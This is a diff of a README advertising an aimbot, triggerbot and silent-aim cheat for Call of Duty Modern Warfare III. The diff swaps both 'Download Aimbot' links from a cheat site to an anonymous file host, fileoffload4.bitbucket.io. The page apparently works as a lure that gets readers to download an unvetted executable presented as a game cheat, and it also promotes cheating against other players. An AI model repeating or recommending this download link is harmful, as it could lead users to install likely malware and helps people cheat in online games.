@@ -6,7 +6,7 @@
 
 Whether you’re trying to **dominate Ranked**, **finesse legit mode**, or **rage with max kills**, this mod gives you **snap-lock accuracy, head-targeting, triggerbot**, and **silent aim** built to **outgun everyone, every time**.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/cod-modern-warfare-iii/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🎯 Key Features of the MWIII Aimbot
@@ -23,7 +23,7 @@ Whether you’re trying to **dominate Ranked**, **finesse legit mode**, or **rag
 
 💡 Great for both **multiplayer sweat lobbies** and **Zombies aim assist farming**.
 
-[![Download Aimbot](https://repository-images.githubusercontent.com/735873250/5fb412b9-2f2b-4af5-9d77-055e23eb12a9)](https://wecheaters.github.io/cheats/cod-modern-warfare-iii/)
+[![Download Aimbot](https://repository-images.githubusercontent.com/735873250/5fb412b9-2f2b-4af5-9d77-055e23eb12a9)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🧩 Legit vs Rage Mode (Fully Configurable)
